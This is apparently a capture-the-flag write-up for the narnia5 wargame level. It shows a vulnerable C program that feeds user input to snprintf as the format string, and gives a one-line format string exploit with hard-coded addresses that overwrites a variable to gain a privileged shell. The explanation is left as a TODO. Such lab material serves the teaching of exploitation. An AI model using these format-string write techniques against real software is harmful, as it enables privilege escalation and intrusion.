# narnia5

## Objective
Change variable ```i``` to equal 500.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
	        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);

	return 0;
}

```

## Solution
This challenge would be trivial with a buffer overflow exploit. However, this is
not possible because ```snprintf``` is used. Thus, we must use a format string
exploit!


(TODO: insert notes explaining solution!)

```
/narnia/narnia5 $(python -c "print '\xc0\xd6\xff\xff\xc0\xd6\xff\xff%492x%n'")
```

